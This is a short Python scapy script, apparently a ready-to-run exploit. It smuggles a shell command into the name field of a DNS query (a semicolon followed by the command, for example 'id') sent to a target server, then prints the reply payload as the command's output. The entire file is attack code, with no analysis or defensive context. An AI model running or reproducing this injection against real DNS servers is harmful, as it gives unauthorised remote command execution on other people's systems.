#/usr/bin/env python
from scapy.all import *
import sys

SERVER=sys.argv[1]
CMD=sys.argv[2]
QNAME= f";{CMD}"

if len(sys.argv) !=3:
  print("Usage dnscmd.py <DNS Server> <command>")
  print("ex: dsncmd.py 192.168.1.53 id")
  sys.exit(1)

request=IP(dst=SERVER)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=QNAME, qtype=32))
answer=sr1(request, verbose=0)

if answer:
  print(answer[Raw].load.decode('utf-8').rstrip('\n'))
else:
  print("No Response Recieved")
